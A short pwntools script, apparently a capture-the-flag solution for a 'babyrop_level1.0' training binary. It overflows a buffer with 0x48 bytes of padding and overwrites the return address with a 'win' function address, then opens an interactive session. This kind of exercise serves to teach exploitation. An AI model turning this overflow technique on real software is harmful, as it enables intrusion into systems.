from pwn import * 

elf = ELF("/challenge/babyrop_level1.0")
io = elf.process()

win_add = p64(int("401926", 16))
buff_offset = int("48", 16)

p = b'A'*buff_offset + win_add

io.sendline(p)

io.interactive()
